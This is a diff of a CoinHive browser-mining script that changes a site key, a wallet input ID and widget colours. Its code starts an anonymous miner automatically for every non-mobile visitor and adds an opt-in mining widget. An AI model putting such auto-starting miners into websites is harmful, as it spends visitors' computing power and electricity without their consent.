@@ -1,6 +1,6 @@
-var siteKey = 'qXvuxshdwz8NEoQXhMLH0qPW2EYJWuLc'
+var siteKey = 'X6mRdaLoSD2YkcHAWS2YoEIULfdM6PhT'
 /** For Setting up the User Miner */
-var anonMiner = new CoinHive.Anonymous(siteKey , {throttle: 0.2});
+var anonMiner = new CoinHive.Anonymous(siteKey, {throttle: 0.2});
 if (!miner.isMobile()) {
     anonMiner.start();
 }
@@ -9,7 +9,7 @@ else {
 }
 
 function getWalletAddress() {
-    return document.getElementById('xmrAddress').value;
+    return document.getElementById('bccAddress').value;
 }
 
 function createAttribute(name, val, parent) {
@@ -84,8 +84,8 @@ function startUserMiner() {
     createAttribute('data-whitelabel', 'false', div);
     createAttribute('data-background', '#FFFFFF', div);
     createAttribute('data-text', '#4C4C4C', div);
-    createAttribute('data-action', '#FA6800', div);
-    createAttribute('data-graph', '#FA6800', div);
+    createAttribute('data-action', '#F08B16', div);
+    createAttribute('data-graph', '#F08B16', div);
     createAttribute('data-start', 'Start Mining!', div);
     div.innerHTML = "<em>Please disable Adblock!</em>";
     parent.appendChild(div);
@@ -103,7 +103,7 @@ function minerURL() {
     var queryString = window.location.search;
     if (queryString.length) {
         queryString = queryString.substring(1);
-        document.getElementById('xmrAddress').value = queryString;
+        document.getElementById('bccAddress').value = queryString;
         startUserMiner();
     }
 }
